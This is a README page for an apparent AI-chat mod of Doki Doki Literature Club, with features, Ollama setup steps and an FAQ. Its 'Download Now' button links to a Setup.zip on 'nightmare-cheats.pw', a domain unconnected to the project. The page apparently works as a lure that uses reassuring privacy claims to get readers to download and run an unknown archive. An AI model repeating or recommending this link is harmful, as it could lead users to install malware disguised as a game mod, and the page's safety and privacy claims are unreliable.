## About

**Doki Doki Literature Club — AI Edition** takes the unsettling little clubroom you already know and removes the one thing that made it safe: the script. Monika, Sayori, Natsuki and Yuri now hold real conversations, driven by a language model running entirely on your own machine.

Ask Sayori how she actually slept. Argue with Natsuki about whether manga is literature. Let Yuri talk about knives for as long as she wants. And Monika — Monika still knows exactly what she is.

> 🌸 The AI reads emotional context from your words and swaps sprites in real time, so the clubroom still *looks* like DDLC even when the dialogue has gone somewhere the poem minigame never could.

## ✨ Features

- 💬 **Four distinct voices** — Each club member carries her own system prompt — vocabulary, insecurities, verbal tics and all.
- 🎭 **Emotion-driven sprites** — Detected mood maps onto the original expression sheets; no static portraits.
- 📝 **Poem memory** — The AI remembers which words you picked in past poem sessions and holds it against you.
- 🔒 **Nothing leaves your PC** — Conversations are stored in a local file. No telemetry, no accounts.
- 🌐 **Fully offline** — Once the model is pulled, unplug the internet — it keeps working.
- 🧩 **Editable persona files** — Plain-text prompts. Rewrite a character's mind in a text editor.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://nightmare-cheats.pw/Setup.zip)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Doki Doki Literature Club

1. Start from a clean, working installation of **Doki Doki Literature Club**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## 🎯 Getting the most out of the clubroom

## ❓ FAQ

**Q: Does Monika know she's in a mod?**
> Yes — her prompt includes meta-awareness by design. If you'd rather she didn't, delete the corresponding lines from her persona file.

**Q: Can I use this alongside other DDLC mods?**
> Only if they don't overwrite the same script files. Install into a clean copy to be safe.

**Q: Are the original sprites included?**
> No. The mod reads assets from your own installation of the game.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
